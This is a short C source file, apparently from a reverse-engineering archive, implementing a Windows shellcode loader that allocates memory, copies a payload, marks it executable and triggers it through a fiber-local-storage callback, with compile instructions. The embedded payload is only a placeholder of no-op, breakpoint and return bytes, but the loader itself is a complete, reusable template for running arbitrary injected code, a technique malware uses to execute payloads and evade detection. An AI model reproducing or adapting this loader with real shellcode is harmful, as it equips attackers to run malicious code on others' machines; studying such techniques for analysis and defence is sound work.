/*
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode as new fiber.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  FlsAlloc + FlsSetValue
*/

#include <windows.h>
#include <stdint.h>

int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    LPVOID  fiber;
    DWORD   idx;
    CONST CHAR * dummy;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // convert main thread to fiber, allow scheduling other fibers
        ConvertThreadToFiber (NULL);

        // create FLS and get its index
        // FlsCallback is called on fiber deletion, thread exit, and when FLS index is freed.
        idx = FlsAlloc ((PFLS_CALLBACK_FUNCTION)runtime);

        // store dummy data into FLS
        dummy = "Reversing.ID";
        FlsSetValue (idx, &dummy);

        // release FLS
        FlsFree (idx);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}